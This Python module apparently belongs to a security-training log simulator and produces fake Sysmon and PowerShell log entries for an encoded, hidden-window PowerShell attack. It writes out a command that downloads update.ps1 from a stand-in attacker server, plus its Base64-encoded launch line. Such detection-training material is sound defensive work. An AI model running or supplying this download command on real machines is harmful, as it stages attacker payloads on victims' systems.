"""Scenario: malicious PowerShell (MITRE ATT&CK T1059.001).

PowerShell is started with a hidden window and an encoded command. Decoded,
the command downloads a file from the attacker's server. Two log sources see
it: Sysmon records the process starting (with the encoded text), and
PowerShell's own script block log records the decoded script.
"""

import base64
import random
from datetime import datetime, timedelta

from backend.models import Log
from backend.simulator import events, noise

SCENARIO = "powershell"

VICTIM = noise.STAFF[4]  # m.rossi in sales
POWERSHELL_EXE = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

# What the attacker wants to run. It is only ever written into a log line,
# and the address it names is reserved for examples, so nothing can be fetched.
SCRIPT = f"Invoke-WebRequest -Uri 'http://{events.ATTACKER_SERVER}/update.ps1' -OutFile \"$env:TEMP\\update.ps1\""
# -EncodedCommand takes the script as Base64 of UTF-16 text. This is the
# genuine encoding, so the log line can be decoded back to SCRIPT as an
# analyst would do it.
ENCODED = base64.b64encode(SCRIPT.encode("utf-16-le")).decode()


def generate(end: datetime, rng: random.Random, victim: tuple = VICTIM,
             parent_image: str = events.EXPLORER) -> list[Log]:
    """Return the attack's log lines, finishing at `end`.

    `parent_image` is the program that started PowerShell. The full attack
    chain passes Word, because there the macro starts it.
    """
    user, host, _ip = victim
    command_line = f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {ENCODED}"
    return [
        events.process_create(end - timedelta(seconds=1), host, user, POWERSHELL_EXE, parent_image,
                              SCENARIO, command_line=command_line),
        events.script_block(end, host, user, SCRIPT, SCENARIO),
    ]
